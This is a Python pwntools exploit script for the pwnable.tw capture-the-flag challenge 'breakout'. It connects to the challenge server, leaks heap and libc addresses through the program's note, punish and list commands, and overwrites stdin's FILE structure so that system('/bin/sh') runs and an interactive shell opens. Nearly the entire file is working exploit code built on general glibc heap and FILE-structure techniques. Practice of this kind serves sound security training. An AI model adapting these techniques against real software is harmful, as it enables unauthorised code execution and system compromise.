#
#	***************************
#	* Pwning exploit template *
#	* Arthor: Cobra           *
#	***************************
#

from pwn import *
import sys

def conn():
	global local
	global debug

	local = 0
	debug = 0

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./breakout_patched')
		if debug:
			gdb.attach(s, gdbscript='''
				b*help
				brva 0x1A72
				b* __libc_system
				b*_IO_flush_all_lockp
				c
			''')
		else:
			raw_input('DEBUG')
	else:
		s = remote('chall.pwnable.tw', 10400)

	return s

s = conn()

elf = ELF('breakout')
libc = ELF('libc_64.so.6')

def list(cell):
	s.sendlineafter(b'> ', b'list')
	s.recvuntil(b'Cell: ' + str(cell).encode())
	s.recvuntil(b'Note: ')

def note(cell, size, note):
	s.sendlineafter(b'> ', b'note')
	s.sendlineafter(b'Cell: ', str(cell).encode())
	s.sendlineafter(b'Size: ', str(size).encode())
	s.sendafter(b'Note: ', note)

def punish(cell):
	s.sendlineafter(b'> ', b'punish')
	s.sendlineafter(b'Cell: ', str(cell).encode())

note(5, 0x100, b'A\n')
note(6, 0x100, b'A\n')
note(5, 0x200, b'A\n')
punish(8)
note(9, 0x40, p64(0))
list(9)

heap_base = int.from_bytes(s.recv(16)[8:], byteorder = 'little', signed = False) - 0x12340
log.info('Heap base: 0x%x', heap_base)

note(9, 0x40, p64(0) * 3 + p32(0) + p32(8) + p64(0) + p64(0x8) + p64(heap_base + 0x12440))
list(8)

if local:
	offset =  0x3c3c78
else:
	offset = 0x3c3b78

libc.address = int.from_bytes(s.recv(8), byteorder = 'little', signed = False) - offset
log.info('Libc base: 0x%x', libc.address)

'''
note(9, 0x40, p64(0) * 3 + p32(0) + p32(8) + p64(0) + p64(0x8) + p64(heap_base + 0x11c20))
list(8)

elf.address = int.from_bytes(s.recv(8), byteorder = 'little', signed = False) - 0x1c28
log.info('PIE base: 0x%x', elf.address)
'''

note(9, 0x40, p64(0) * 3 + p32(0) + p32(8) + p64(0) + p64(0) + p64(0) + p64(libc.symbols['_IO_2_1_stdin_'] + 0x38))
note(0, 0xe0, b'/bin/sh\x00' + p64(0) * 3 + p64(2) + p64(3) + p64(0) * 20 + p64(libc.symbols['system']) + p64(heap_base + 0x124f8))

s.sendlineafter(b'> ', b'note')
s.sendlineafter(b'Cell: ', b'1')

s.interactive()
